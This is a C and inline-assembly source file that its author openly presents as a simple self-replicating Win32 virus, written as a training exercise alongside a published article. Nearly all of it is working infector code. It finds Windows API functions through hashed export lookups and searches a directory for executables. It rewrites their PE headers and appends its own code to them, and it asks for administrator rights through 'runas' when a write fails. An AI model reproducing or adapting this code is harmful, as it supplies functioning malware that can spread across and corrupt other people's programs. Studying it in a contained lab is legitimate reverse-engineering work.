/*
 Author: Dan Bomgard

 Description:
	The code contained in this file is an implementation of a simple virus.
	This virus will only infect win32 executables located in C:\Virus directory.
	The virus has no actual payload besides the replicating mechanism itself.

	The algorithm is described in more detail in the authors article originaly published at www.digitalwhisper.co.il 

  Notice:
	for correct building of the virus this code requires several compiler options adjustments and also
	some hex modifications of the created executable. All needed adjustments and modifications are described in  the aforementioned article.
	still, it is recomended to only test the virus itself in a contained environment and not in a personal computer or workstation.
	Auther takes no responsibility of further usage of this code and the systems it may destroy.

	Enjoy!
*/


#include <Windows.h>
// no usage of windows API will directly take place since this code needs to be independent
// I am only including this library so I can use its definitions for ease of writing and 
// also code readability. no actual win API will be used through this included module.

// definition of all windows API function hashes - can be found online or calculated 
#define LOAD_LIBRARY_W_HASH_LITTLE_ENDIAN				0xec0e4ea4
#define MESSAGE_BOX_A_HASH_LITTLE_ENDIAN				0xbc4da2a8
#define FIND_FIRST_FILE_W_HASH_LITTLE_ENDIAN			0x63d6c07b
#define FIND_NEXT_FILE_W_HASH_LITTLE_ENDIAN				0xa5e1acad
#define LSTRLEN_W_HASH_LITTLE_ENDIAN					0xdd434751
#define GET_LAST_ERROR_HASH_LITTLE_ENDIAN				0x75da1966
#define CREATE_FILE_W_HASH_LITTLE_ENDIAN				0x7c0017bb
#define CLOSE_HANDLE_HASH_LITTLE_ENDIAN					0x0ffd97fb
#define READ_FILE_HASH_LITTLE_ENDIAN					0x10fa6516
#define GET_MODULE_FILENAME_W_HASH_LITTLE_ENDIAN		0x45b06d8c
#define GET_CURRENT_PROCESS_HASH_LITTLE_ENDIAN			0x7b8f17e6
#define SHELL_EXECUTE_EX_W_HASH_LITTLE_ENDIAN			0xfc2ed8dd
#define WRITE_FILE_HASH_LITTLE_ENDIAN					0xe80a791f
#define SET_FILE_POINTER_HASH_LITTLE_ENDIAN				0x76da08ac

/*
bibliography:
	1. Xeno Kovahs Life of Binaries online course - my project is actually an attempt at recreating by myself the "BabysFirstPhage" excercise on a win8 machine, I found myself copying most code from this project
		this course is nothing short of amazing. according to the creative commons license I can copy code from this project as long as I state its origin.
			http://opensecuritytraining.info/LifeOfBinaries.html

	2. Xeno Kovahs Introduction to x86 & Intermediate x86 Classes - same style course as the above, didnt copy any code from these courses but it certainly helped my understaning of x86 assembly
			http://opensecuritytraining.info/IntroX86.html
			http://opensecuritytraining.info/IntermediateX86.html

	3. Skape/Matt Miller's win32 shellcode tutorial - this is also stated as a source in "LoB" code but since its so important and really the heart of the mechanism
			http://www.hick.org/code/skape/papers/win32-shellcode.pdf
	2. the shellcode PDF
			
	3. all windows API function hashes I used and also the mechanism with which they are calculated and used to find the actual function code can be found in this link:
			http://hooked-on-mnemonics.blogspot.co.il/2011/06/massive-2-mb-shellcode-api-hash-list.html
*/

_declspec(naked) void ReservedSection()
{
	_asm
	{
		_emit 0xe8
		_emit 0x00
		_emit 0x00
		_emit 0x00
		_emit 0x00
		pop eax
		add eax, 5
		ret

		//Virus signature: (currently not used)
		_emit 0x90
		_emit 0x0d
		_emit 0xbe
		_emit 0xef

		//original executable entry point:
		_emit 0xee
		_emit 0x0f
		_emit 0xec
		_emit 0x1c
	}
}


_declspec(naked) void PathString()
//the result calling this fundtion is the address of the wanted string in the eax register
{
	_asm
	{
		// function prologue
		_emit 0xe8
		_emit 0x00
		_emit 0x00
		_emit 0x00
		_emit 0x00
		pop eax
		add eax,5
		ret
		////////////
		//actual string
		//-------------

		//the string "C:\Virus" in wide char form
		_emit 0x43
		_emit 0x00
		_emit 0x3a
		_emit 0x00
		_emit 0x5c
		_emit 0x00
		_emit 0x56
		_emit 0x00
		_emit 0x69
		_emit 0x00
		_emit 0x72
		_emit 0x00
		_emit 0x75
		_emit 0x00
		_emit 0x73
		_emit 0x00
		//the string "\*.*"
		_emit 0x5c
		_emit 0x00
		_emit 0x2a
		_emit 0x00
		_emit 0x2e
		_emit 0x00
		_emit 0x2a
		_emit 0x00
		// terminating NULL BYTE X2 for wide char form
		_emit 0x00
		_emit 0x00
	}
}

_declspec(naked) void RunasString()
//the result calling this fundtion is the address of the wanted string in the eax register
{
	_asm
	{
		// function prologue
		_emit 0xe8
			_emit 0x00
			_emit 0x00
			_emit 0x00
			_emit 0x00
			pop eax
			add eax, 5
			ret
			////////////
			//actual string
			//-------------

			//the string "runas" in wide char form
			_emit 0x72
			_emit 0x00
			_emit 0x75
			_emit 0x00
			_emit 0x6e
			_emit 0x00
			_emit 0x61
			_emit 0x00
			_emit 0x73
			_emit 0x00
			// terminating NULL BYTE X2 for wide char form
			_emit 0x00
			_emit 0x00
	}
}


_declspec(naked) void Shell32String()
//the result of calling this fundtion is the address of the wanted string in the eax register
{
	_asm
	{
		// function prologue
		_emit 0xe8
			_emit 0x00
			_emit 0x00
			_emit 0x00
			_emit 0x00
			pop eax
			add eax, 5
			ret
			////////////
			//actual string
			//-------------

			//the string "shell32" in wide char form
			_emit 0x73
			_emit 0x0
			_emit 0x68
			_emit 0x0
			_emit 0x65
			_emit 0x0
			_emit 0x6c
			_emit 0x0
			_emit 0x6c
			_emit 0x0
			_emit 0x33
			_emit 0x0
			_emit 0x32
			_emit 0x0
			_emit 0x2e
			_emit 0x0
			_emit 0x64
			_emit 0x0
			_emit 0x6c
			_emit 0x0
			_emit 0x6c
			_emit 0x0
			_emit 0x0
			_emit 0x0
	}
}


void main(int argc,char* argv[])
{
	UINT32 Kernel32BaseAddr=0;
	UINT32 shell32BaseAddr = 0;

	UINT32 LoadLibraryWAddr=0;

	// my WinAPI function pointers
	double(_stdcall * MessageBoxAAddr)() = 0;
	HANDLE (_stdcall * FindFirstFileWAddr)() = 0;
	double(_stdcall * FindNextFileWAddr)() = 0;
	int(_stdcall * lstrlenWAddr)() = 0;
	DWORD(_stdcall * GetLastErrorAddr)() = 0;
	HANDLE(_stdcall * CreateFileWAddr)() = 0;
	HANDLE(_stdcall * CloseHandleWAddr)() = 0;
	BOOL (_stdcall * ReadFileAddr)() = 0;
	DWORD(_stdcall * GetModuleFilenameWAddr)() = 0;
	HANDLE(_stdcall * GetCurrentProcessAddr)() = 0;
	BOOL(_stdcall * ShellExecuteExWAddr)() = 0;
	BOOL(_stdcall * WriteFileAddr)() = 0;
	DWORD(_stdcall * SetFilePointerAddr)() = 0;

	DWORD tempOriginalEP = 0;
	DWORD multiUseDword;
	char buffer[0x1000];
	char* PathS ;
	char* shell32string;
	char* runasString;
	HANDLE FileSearchHandle = 0;
	HANDLE readFileHandle = 0;
	WIN32_FIND_DATA FoundFile;
	int stringLength;
	int stringLength2;
	DWORD i;
	char* tempSPpointer;
	DWORD* virusSignature;
	DWORD* originalEP=0;
	PIMAGE_NT_HEADERS ntHdrPtr = 0;
	PIMAGE_SECTION_HEADER sectionPtr = 0;
	WORD numberOfSections = 0;

	SHELLEXECUTEINFO sei = {0};
	char szPath[MAX_PATH];
	HANDLE hWnd;

	_asm
	{
		call RunasString
		mov runasString,eax
		call PathString
		mov  PathS, eax
		call Shell32String
		mov  shell32string, eax
		call ReservedSection
		mov	 virusSignature,eax
		add eax,4
		mov originalEP,eax

		jmp start

		find_kernel32_base :
		// finding kernel32 base in win7
		xor ebx, ebx               // clear ebx
			mov ebx, fs : [0x30]       // get a pointer to the PEB
			mov ebx, [ebx + 0x0C]    // get PEB->Ldr
			mov ebx, [ebx + 0x14]    // get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
			mov ebx, [ebx]           // get the next entry (2nd entry)
			mov ebx, [ebx]           // get the next entry (3rd entry)
			mov ebx, [ebx + 0x10]    // get the 3rd entries base address (kernel32.dll) 
			ret

		find_function :
		pushad
			mov ebp, [esp + 0x24]
			mov eax, [ebp + 0x3c]
			mov edx, [ebp + eax + 0x78]
			add edx, ebp
			mov ecx, [edx + 0x18]
			mov ebx, [edx + 0x20]
			add ebx, ebp
		find_function_loop :
		jecxz find_function_finished
			dec ecx
			mov esi, [ebx + ecx * 4]
			add esi, ebp	 // esi now points to current function string
	
			// start of compute hash function
		compute_hash :	 // put this into a function
		xor edi, edi	 // edi will hold our hash result
			xor eax, eax	 // eax holds our current char
			cld
		compute_hash_again :
		lodsb	 // puts current char into eax (except first time)
			test al, al	 // checks for null - end of function string
			jz compute_hash_finished
			ror edi, 0xd	 // rotate the current hash
			add edi, eax	 // adds current char to current hash
			jmp compute_hash_again
		compute_hash_finished :	 // end of compute hash function
	find_function_compare :
		//this is where it compares the calculated hash to our hash
		cmp edi, [esp + 0x28]
		jnz find_function_loop
		mov ebx, [edx + 0x24]
		add ebx, ebp
		mov cx, [ebx + 2 * ecx]
		mov ebx, [edx + 0x1c]
		add ebx, ebp
		mov eax, [ebx + 4 * ecx]
		add eax, ebp
		//this is the VMA of the function
		mov[esp + 0x1c], eax
	find_function_finished :
		popad
		ret

	start :

		//find the base of kernel32 library to locate all relevant API functions I need 
		call find_kernel32_base
		mov Kernel32BaseAddr, ebx

		// first find LoadLibraryA function
		push LOAD_LIBRARY_W_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov LoadLibraryWAddr,eax

		// using LoadLibraryA immidiately load the shell32 library so I can load relevant API functions from it as well 
		push shell32string
		call LoadLibraryWAddr
		mov shell32BaseAddr, eax

		push FIND_FIRST_FILE_W_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov FindFirstFileWAddr, eax

		push FIND_NEXT_FILE_W_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov FindNextFileWAddr, eax

		push LSTRLEN_W_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov lstrlenWAddr, eax

		push GET_LAST_ERROR_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov GetLastErrorAddr, eax

		push CREATE_FILE_W_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov CreateFileWAddr, eax

		push CLOSE_HANDLE_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov CloseHandleWAddr, eax

		push READ_FILE_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov ReadFileAddr, eax

		push GET_MODULE_FILENAME_W_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov GetModuleFilenameWAddr, eax

		push GET_CURRENT_PROCESS_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov GetCurrentProcessAddr, eax

		push SHELL_EXECUTE_EX_W_HASH_LITTLE_ENDIAN
		push shell32BaseAddr
		call find_function
		mov ShellExecuteExWAddr, eax

		push WRITE_FILE_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov WriteFileAddr, eax

		push SET_FILE_POINTER_HASH_LITTLE_ENDIAN
		push Kernel32BaseAddr
		call find_function
		mov SetFilePointerAddr, eax
	}


	FileSearchHandle = FindFirstFileWAddr(PathS, &FoundFile);
	while (GetLastErrorAddr() != ERROR_NO_MORE_FILES) // traverse all files in directory "C:\Virus"
	{
		stringLength = lstrlenWAddr(FoundFile.cFileName);
		if (stringLength > 4)
		{
			if (FoundFile.cFileName[stringLength * 2 - 2] == 0x65 &&
				FoundFile.cFileName[stringLength * 2 - 4] == 0x78 &&
				FoundFile.cFileName[stringLength * 2 - 6] == 0x65)
			// comparing the file ending to "exe". when comparing this way, there is no usage of the data section, ASCII values are inserted into the code section
			{
				_asm
				{
					mov tempSPpointer,esp
				}
				tempSPpointer += 0x30;
				stringLength2 = lstrlenWAddr(PathS);
				for (i = 0; i < 0x12; i++)
				{
					tempSPpointer[i] = PathS[i];

				}
				tempSPpointer += 0x12;
				for (i = 0; i < stringLength * 2; i++)
				{
					tempSPpointer[i] = FoundFile.cFileName[i];
				}
				tempSPpointer[i++] = NULL;
				tempSPpointer[i++] = NULL;
				tempSPpointer -= 0x12;

				//opening the file for writing 
				readFileHandle = CreateFileWAddr(tempSPpointer, (GENERIC_READ|GENERIC_WRITE), (FILE_SHARE_READ|FILE_SHARE_WRITE), NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

				if (readFileHandle == 0xffffffff) 
					// no permission to write to the file, this could happen for many reasons but most likely in this context is due to security token that does not correspond with admin (no privilege)
					// thats why we will try to re-open the executable with admin permission, this will ask the user for admin rights/
				{
					GetModuleFilenameWAddr(NULL, szPath, MAX_PATH);
					stringLength2 = lstrlenWAddr(tempSPpointer);
					for (multiUseDword = 0; multiUseDword < stringLength2 * 2; multiUseDword++)
						// compare the current file name to the file name of the running process, if they are the same, the operation will fail even with admin privilege so we want to skip the file
					{
						if (tempSPpointer[multiUseDword] != szPath[multiUseDword])
						{
							break;
						}
					}
					if (multiUseDword != (stringLength2*2))
					{
						hWnd = GetCurrentProcessAddr();
						sei.cbSize = /*sizeof(sei)*/ 0x3c; // inputing the calculated size of "sei" structure to prevent a need to use the sizeof function
						sei.lpVerb = runasString;
						sei.lpFile = szPath;
						sei.hwnd = hWnd;
						sei.nShow = SW_NORMAL;
						ShellExecuteExWAddr(&sei);

						if (GetLastErrorAddr() == ERROR_CANCELLED)
						{
							_asm {
								mov eax, originalEP
								mov eax, [eax]
								jmp eax
							}
						}
						goto EXIT;
					}
					
				}
				else
				{
					ReadFileAddr(readFileHandle, &buffer, 0x1000, &i, NULL);
					if (((PIMAGE_DOS_HEADER)buffer)->e_res[0] == 0xdead)
						// checking whether the file is already infected, if it is, just go on to the next file 
					{
						FindNextFileWAddr(FileSearchHandle, &FoundFile);
						continue;
					}
					ntHdrPtr = (PIMAGE_NT_HEADERS)((unsigned char *)&buffer + ((PIMAGE_DOS_HEADER)buffer)->e_lfanew);
					tempOriginalEP = ntHdrPtr->OptionalHeader.AddressOfEntryPoint + ntHdrPtr->OptionalHeader.ImageBase;
					
					((PIMAGE_DOS_HEADER)buffer)->e_res[0] = 0xdead;
					numberOfSections = *(WORD*)((BYTE*)ntHdrPtr + 0x6) -1 ;
					
					// creating a pointer to the last section
					sectionPtr = (BYTE*)ntHdrPtr + sizeof(IMAGE_NT_HEADERS)+(numberOfSections * sizeof(IMAGE_SECTION_HEADER));

					//updating the last sections relevant fields to accomodate the virus code
					sectionPtr->Characteristics = (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE);
					sectionPtr->SizeOfRawData += 0x1000;
					sectionPtr->Misc.VirtualSize += 0x1000;

					//updating the parameters image size and new entry point in the header
					ntHdrPtr->OptionalHeader.AddressOfEntryPoint = (BYTE*)(sectionPtr->VirtualAddress) + sectionPtr->SizeOfRawData + 0xa0 - 0x1000;
					ntHdrPtr->OptionalHeader.SizeOfImage += 0x1000;
					
					SetFilePointerAddr(readFileHandle, NULL, NULL, FILE_BEGIN); // set file handler back to the begining of the file
					WriteFileAddr(readFileHandle, &buffer, 0x1000, &multiUseDword, NULL); // re-write the file header with the fixed file header I just altered 

					__asm{
						xor eax, eax;	//going to write 4 bytes of 0 at a time
						mov ecx, 0x400; //0x400 * 4 bytes at a time = 0x1000 bytes total written
						lea edi, buffer;//Since buffer is an array, we want the address where it starts
						rep stos dword ptr es : [edi];//If you don't put the "dword ptr" it generates the "byte ptr" form!
					}
					multiUseDword = PathS - 0xa;
					__asm{
						mov ecx, 0x400;	
						lea edi, buffer;//Since buffer is an array, we want the address where it starts
						mov esi, multiUseDword; //Where the special data preceeding the virus code starts
						rep movs dword ptr es : [edi], ds : [esi]; //If you don't put the "dword ptr" it generates the "byte ptr" form!
					}
					*(DWORD*)(&(buffer[(DWORD)originalEP - multiUseDword ])) = tempOriginalEP;

					CloseHandleWAddr(readFileHandle);
					readFileHandle = CreateFileWAddr(tempSPpointer, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					SetFilePointerAddr(readFileHandle, 0, NULL, FILE_END);
					WriteFileAddr(readFileHandle, &buffer, 0x1000 ,&multiUseDword, NULL);
				}
			}
		}
		FindNextFileWAddr(FileSearchHandle, &FoundFile); // continue to next file
	}

	if (*originalEP != 0x1cec0fee)
	// Check whether or not this is the actual virus executable, in this case there is no need to jump to any other code
	// if this is just an infected program executable the value in "originalEP" will be different then 0x1cecofee and 
	// the execution of the real program will now start
	{
		_asm {
			mov eax, originalEP
				mov eax, [eax]
				jmp eax
		}
	}

EXIT:
	// the stack is misaligned - not very professional but since I removed OS checking this wont crash
	{}
}



